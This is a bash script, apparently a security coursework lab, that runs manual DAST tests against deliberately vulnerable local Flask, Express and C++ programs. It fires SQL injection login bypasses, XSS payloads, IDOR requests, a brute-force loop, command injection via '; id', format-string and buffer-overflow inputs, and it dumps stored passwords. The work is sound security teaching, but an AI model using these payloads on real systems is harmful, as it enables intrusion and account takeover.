#!/bin/bash
# Ручное DAST-тестирование: запускаем приложения и проверяем уязвимости живыми запросами.
# Запуск: bash dast/dast_tests.sh   (из папки pr2, нужны запущенные python3 и node)
cd "$(dirname "$0")/.."
run() { echo; echo "\$ $*"; "$@"; }
J=/tmp/jar_sarah; rm -f /tmp/jar_admin $J

echo "===== VulnMart (Flask, :5055) ====="
( cd vulnmart && rm -f vulnmart.db && nohup python3 app.py > /tmp/vulnmart.log 2>&1 & )
( cd /root/jsrun && nohup node vulnerable.js > /tmp/js.log 2>&1 & )
sleep 3

echo; echo "--- 1. SQL-инъекция: вход как admin без пароля ---"
echo "\$ curl -si -c /tmp/jar_admin -d \"username=admin' --\" -d 'password=wrong' http://127.0.0.1:5055/login | head -4"
curl -si -c /tmp/jar_admin -d "username=admin' --" -d 'password=wrong' http://127.0.0.1:5055/login | head -4
echo "\$ curl -s -b /tmp/jar_admin http://127.0.0.1:5055/ | grep -o 'Logged in as[^<]*\|admin' | head -2"
curl -s -b /tmp/jar_admin http://127.0.0.1:5055/orders | grep -oE 'Mechanical Keyboard|4242' | head -2
echo "(видим заказ админа -> вход выполнен без пароля)"

echo; echo "--- 2. Хранимая XSS: отзыв с <script> ---"
echo "\$ curl -s -b /tmp/jar_admin -d 'comment=<script>alert(1)</script>' http://127.0.0.1:5055/product/1/review"
curl -s -o /dev/null -b /tmp/jar_admin -d 'comment=<script>alert(1)</script>' http://127.0.0.1:5055/product/1/review
echo "\$ curl -s http://127.0.0.1:5055/product/1 | grep script"
curl -s http://127.0.0.1:5055/product/1 | grep script

echo; echo "--- 3. IDOR: sarah читает чужой заказ №1 ---"
echo "\$ curl -s -c $J -d 'username=sarah' -d 'password=sarah1995' http://127.0.0.1:5055/login"
curl -s -o /dev/null -c $J -d 'username=sarah' -d 'password=sarah1995' http://127.0.0.1:5055/login
echo "\$ curl -s -b $J http://127.0.0.1:5055/order/1 | grep -E 'Mechanical|Admin HQ|4242'"
curl -s -b $J http://127.0.0.1:5055/order/1 | grep -E 'Mechanical|Admin HQ|4242' | sed 's/^ *//'

echo; echo "--- 4. Слабая аутентификация: 30 попыток подряд без блокировки ---"
echo "\$ for i in \$(seq 30); do curl -s -o /dev/null -w '%{http_code} ' -d 'username=admin' -d \"password=x\$i\" .../login; done"
for i in $(seq 30); do curl -s -o /dev/null -w '%{http_code} ' -d 'username=admin' -d "password=x$i" http://127.0.0.1:5055/login; done; echo
echo "\$ curl -s -o /dev/null -w '%{http_code}\n' -L -c /tmp/jar_w -d 'username=admin' -d 'password=password123' http://127.0.0.1:5055/login"
curl -s -o /dev/null -w 'подбор пароля password123 -> %{http_code}\n' -c /tmp/jar_w -d 'username=admin' -d 'password=password123' http://127.0.0.1:5055/login
echo "\$ sqlite3 vulnmart/vulnmart.db 'select username,password from users'"
sqlite3 vulnmart/vulnmart.db 'select username,password from users'

echo; echo "===== vulnerable.js (Express, :3000) ====="
echo "--- 5. SQLi: username=' OR '1'='1 ---"
echo "\$ curl -sG --data-urlencode \"username=' OR '1'='1\" http://127.0.0.1:3000/user"
curl -sG --data-urlencode "username=' OR '1'='1" http://127.0.0.1:3000/user; echo
echo "--- 6. XSS: name=<script>alert(1)</script> ---"
echo "\$ curl -sG --data-urlencode 'name=<script>alert(1)</script>' http://127.0.0.1:3000/hello"
curl -sG --data-urlencode 'name=<script>alert(1)</script>' http://127.0.0.1:3000/hello; echo
echo "--- 7. Command injection: host=127.0.0.1; id ---"
echo "\$ curl -sG --data-urlencode 'host=127.0.0.1; id' http://127.0.0.1:3000/ping"
curl -sG --data-urlencode 'host=127.0.0.1; id' http://127.0.0.1:3000/ping | tail -2

echo; echo "===== vulnerable.cpp ====="
echo "--- 8. Format string: ./vulnerable '%x.%x.%x' ---"
echo "\$ stdbuf -o0 ./cpp/vulnerable '%x.%x.%x'"; stdbuf -o0 ./cpp/vulnerable '%x.%x.%x' 2>&1 | head -2; echo
echo "--- 9. Command injection: ./vulnerable 'hi;id' ---"
echo "\$ stdbuf -o0 ./cpp/vulnerable 'hi;id'"; stdbuf -o0 ./cpp/vulnerable 'hi;id' 2>&1 | tail -3; echo
echo "--- 10. Buffer overflow: 40 символов 'A' ---"
echo "\$ stdbuf -o0 ./cpp/vulnerable \$(python3 -c \"print('A'*40)\")"
stdbuf -o0 ./cpp/vulnerable $(python3 -c "print('A'*40)") 2>&1 | tail -3

pkill -f "python3 app.py"; pkill -f "node vulnerable.js"; exit 0
